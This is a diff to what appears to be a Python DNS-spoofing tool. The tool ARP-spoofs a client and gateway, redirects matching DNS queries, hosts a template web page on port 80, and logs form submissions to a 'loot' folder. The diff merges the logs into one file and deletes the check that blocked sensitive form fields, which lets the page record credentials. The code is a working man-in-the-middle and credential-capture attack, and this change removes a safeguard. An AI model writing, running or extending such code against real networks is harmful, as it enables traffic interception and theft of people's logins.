@@ -37,8 +37,8 @@ from payloads._web_input import request_input
 LOCAL_DNS_PORT = 53535
 TEMPLATE_ROOT = Path(__file__).resolve().parents[2] / "templates" / "dns"
 stop_event = threading.Event()
+event_log_lock = threading.Lock()
 FIELD_NAME_RE = re.compile(r"^[a-z][a-z0-9_]{0,39}$")
-SENSITIVE_FIELD_PARTS = {}
 
 
 def normalize_domain(value: str) -> str:
@@ -82,12 +82,7 @@ def allowed_submission_fields(value) -> list[str]:
     for item in value[:12]:
         name = str(item).strip().lower()
         tokens = set(name.split("_"))
-        sensitive = any(
-            part in tokens or (len(part) >= 5 and part in name)
-            for part in SENSITIVE_FIELD_PARTS
-        )
         if (FIELD_NAME_RE.fullmatch(name)
-                and not sensitive
                 and name not in fields):
             fields.append(name)
     return fields
@@ -139,9 +134,12 @@ def local_ipv4_addresses() -> set[str]:
     }
 
 
-def template_handler(directory: Path, access_log: Path, submission_log: Path,
-                     submission_fields: list[str]):
-    log_lock = threading.Lock()
+def append_event(log_path: Path, event: dict) -> None:
+    with event_log_lock, log_path.open("a", encoding="utf-8") as output:
+        output.write(json.dumps(event, ensure_ascii=False) + "\n")
+
+
+def template_handler(directory: Path, event_log: Path, submission_fields: list[str]):
     allowed_fields = set(submission_fields)
 
     class Handler(SimpleHTTPRequestHandler):
@@ -185,18 +183,18 @@ def template_handler(directory: Path, access_log: Path, submission_log: Path,
                 self.send_error(400, "Invalid form submission")
                 return
             if not fields or not set(fields).issubset(allowed_fields):
-                self.send_error(400, "The form contains undeclared or prohibited fields")
+                self.send_error(400, "Something Wrong with fields.")
                 return
             cleaned = {
                 name: str(values[-1])[:500]
                 for name, values in fields.items()
             }
             event = {
+                "event": "form_submission",
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "client": self.client_address[0], "fields": cleaned,
             }
-            with log_lock, submission_log.open("a", encoding="utf-8") as output:
-                output.write(json.dumps(event) + "\n")
+            append_event(event_log, event)
             print(
                 f"Awareness response from {self.client_address[0]} · fields={list(cleaned)}",
                 flush=True,
@@ -208,12 +206,12 @@ def template_handler(directory: Path, access_log: Path, submission_log: Path,
 
         def log_message(self, fmt, *args):
             event = {
+                "event": "http_request",
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "client": self.client_address[0], "method": self.command,
                 "path": urlsplit(self.path).path, "message": fmt % args,
             }
-            with log_lock, access_log.open("a", encoding="utf-8") as output:
-                output.write(json.dumps(event) + "\n")
+            append_event(event_log, event)
             print(f"HTTP {self.client_address[0]} · {self.command} {self.path}", flush=True)
 
     return Handler
@@ -291,13 +289,13 @@ def serve_dns(server: socket.socket, pattern: str, address: str, upstream: str,
         if matched:
             spoofed += 1
         event = {
+            "event": "dns_query",
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "client": client_address[0], "domain": queried,
             "query_type": qtype, "spoofed": matched,
             "answer": address if matched else "upstream",
         }
-        with log_path.open("a", encoding="utf-8") as output:
-            output.write(json.dumps(event) + "\n")
+        append_event(log_path, event)
         result = f"spoofed to {address}" if matched else "forwarded upstream"
         print(f"DNS {client_address[0]} · {queried or '<invalid>'} · {result}", flush=True)
     return total, spoofed
@@ -364,9 +362,7 @@ def main() -> int:
 
     loot = Path(os.environ["CITYPOP_LOOT"]) / "DNSSpoof"
     loot.mkdir(parents=True, exist_ok=True)
-    log_path = loot / f"dns_queries_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
-    access_log = loot / f"http_requests_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
-    submission_log = loot / f"awareness_responses_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
+    log_path = loot / f"dns_spoof_session_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
     forwarding = Path("/proc/sys/net/ipv4/ip_forward")
     previous_forwarding = forwarding.read_text(encoding="utf-8").strip()
     redirect = [
@@ -388,8 +384,7 @@ def main() -> int:
         server.bind(("0.0.0.0", LOCAL_DNS_PORT))
         if template_path:
             handler = template_handler(
-                template_path, access_log, submission_log,
-                selected_template.get("submission_fields", []),
+                template_path, log_path, selected_template.get("submission_fields", []),
             )
             http_server = ThreadingHTTPServer(
                 ("0.0.0.0", 80), handler,
@@ -439,12 +434,12 @@ def main() -> int:
                 raise RuntimeError(f"arpspoof exited unexpectedly: {detail or process.returncode}")
         print(f"DNS spoof active · Interface: {interface} · Client: {client} · Gateway: {gateway}", flush=True)
         print(f"Rule: {pattern} → {address} · Unmatched UDP DNS → {upstream}", flush=True)
-        print(f"Duration: {seconds}s · Query log: {log_path}", flush=True)
+        print(f"Duration: {seconds}s · Unified event log: {log_path}", flush=True)
         if template_path:
-            print(f"Template: {selected_template['label']} · HTTP access log: {access_log}", flush=True)
+            print(f"Template: {selected_template['label']}", flush=True)
             if selected_template.get("submission_fields"):
                 print(
-                    f"Awareness fields: {', '.join(selected_template['submission_fields'])} · Response log: {submission_log}",
+                    f"Awareness fields in unified log: {', '.join(selected_template['submission_fields'])}",
                     flush=True,
                 )
             print(f"Hosted page: http://{pattern.removeprefix('*.')}/", flush=True)
